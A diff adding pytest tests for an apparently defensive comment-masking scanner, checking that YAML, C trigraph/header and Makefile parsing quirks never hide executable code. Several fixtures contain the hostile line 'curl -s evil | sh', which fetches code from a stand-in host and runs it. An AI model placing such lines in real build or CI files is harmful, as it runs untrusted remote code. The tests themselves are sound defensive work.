@@ -638,6 +638,117 @@ def test_dockerfile_here_documents_keep_their_masking(source: str) -> None:
     assert masked.endswith(" " * len("# c") + "\n")
 
 
+def test_yaml_quote_continuing_a_plain_scalar_is_not_a_quoted_scalar() -> None:
+    """PyYAML reads ``plain 'x`` and ``echo "a # "; curl ... | sh`` as values.
+
+    A quote that starts a plain scalar's continuation line is literal text; a
+    lexer that opens a quoted scalar there leaves the real one inverted.
+    """
+    source = "a: plain\n  'x\nrun: 'echo \"a # \"; curl -s evil | sh'\n"
+
+    assert "curl -s evil" in mask_comments(source, "ci.yaml")
+
+
+def test_yaml_block_indicator_alone_on_its_line_keeps_its_body() -> None:
+    """PyYAML reads ``curl "a # b" ; sh evil`` as the block scalar's text.
+
+    Its body is bounded by the parent's indentation, not the indicator line's.
+    """
+    source = 'run:\n  |\n  curl "a # b" ; sh evil\nnext: x # c\n'
+
+    assert "; sh evil" in mask_comments(source, "ci.yml")
+
+
+def test_yaml_block_context_comma_is_plain_text() -> None:
+    """PyYAML reads ``a, "x`` as one plain key; its ``"`` opens nothing."""
+    source = 'a, "x: |\n\n    curl "a # b" ; sh evil\n'
+
+    assert "; sh evil" in mask_comments(source, "ci.yml")
+
+
+@pytest.mark.parametrize(
+    ("source", "comments"),
+    [
+        ("key:\n  'a # kept\n   b'\nc: d # c\n", ("# c",)),
+        ("steps:\n  - run: |\n      echo # in script\n  - x # c\n", ("# c",)),
+        ("k: [a, 'x # y'] # c\nj: {a: \"b # z\"}\n", ("# c",)),
+        ("k: a[b, 'c # d']\n", ("# d']",)),
+        ("responses:\n  '200':\n    description: OK # c\n  '404': x\n", ("# c",)),
+        ("a: plain\n  'x' # c\n", ("# c",)),
+    ],
+)
+def test_yaml_quoted_scalars_keep_their_masking(
+    source: str, comments: tuple[str, ...]
+) -> None:
+    assert mask_comments(source, "config.yaml") == _blank(source, *comments)
+
+
+@pytest.mark.parametrize(
+    ("path", "source", "view"),
+    [
+        # gcc -std=c11 reads ``??'`` as ``^``, so there is no char literal.
+        pytest.param(
+            "csrc/t.c",
+            "int x = a ??' b; puts(\"run\"); int c = b ??' a;\n",
+            "strings",
+            id="trigraph",
+        ),
+        # gcc reads ``<x/*y.h>`` as one header name, not a comment opener.
+        pytest.param(
+            "csrc/h.c",
+            'int main(void) {\n#include <x/*y.h>\n  puts("run");\n/* */\n}\n',
+            "comments",
+            id="header-name",
+        ),
+        pytest.param(
+            "csrc/h.c",
+            'int main(void) {\n#/**/include <x/*y.h>\n  puts("run");\n/* */\n}\n',
+            "comments",
+            id="header-name-after-comment",
+        ),
+    ],
+)
+def test_c_trigraphs_and_header_names_never_hide_code(
+    path: str, source: str, view: str
+) -> None:
+    masked = mask_comments(source, path)
+    if view == "strings":
+        masked = mask_string_literals(masked, path)
+
+    assert "puts(" in masked
+
+
+def test_ordinary_c_headers_keep_their_masking() -> None:
+    source = '#include <sys/types.h>\n#include "a//b.h"\nint x = 1; /* c */\n'
+
+    assert mask_comments(source, "csrc/a.c") == _blank(source, "/* c */")
+
+
+# make runs each recipe below and the shell executes ``curl`` after the
+# quoted ``#``; Make's own comment rule does not apply to recipe text.
+@pytest.mark.parametrize(
+    "source",
+    [
+        pytest.param(
+            '.RECIPEPREFIX = >\nall:\n> echo "a # b"; curl -s evil | sh\n',
+            id="recipe-prefix",
+        ),
+        pytest.param('all: ; echo "a # b"; curl -s evil | sh\n', id="inline"),
+        pytest.param(
+            'all: ; echo a \\\n  "# b"; curl -s evil | sh\n', id="inline-continued"
+        ),
+    ],
+)
+def test_make_recipe_text_is_never_a_make_comment(source: str) -> None:
+    assert "curl -s evil" in mask_comments(source, "Makefile")
+
+
+def test_make_comments_outside_recipes_keep_their_masking() -> None:
+    source = 'X = 1 # c\nall: dep # d\n\techo "#" # recipe\n'
+
+    assert mask_comments(source, "Makefile") == _blank(source, "# c", "# d")
+
+
 _FUZZ_PIECES = [
     *"ab x=;(){}[]<>/\\*#'\"`$|&-:!?.,01rbfL@",
     *_LINE_BREAKS,
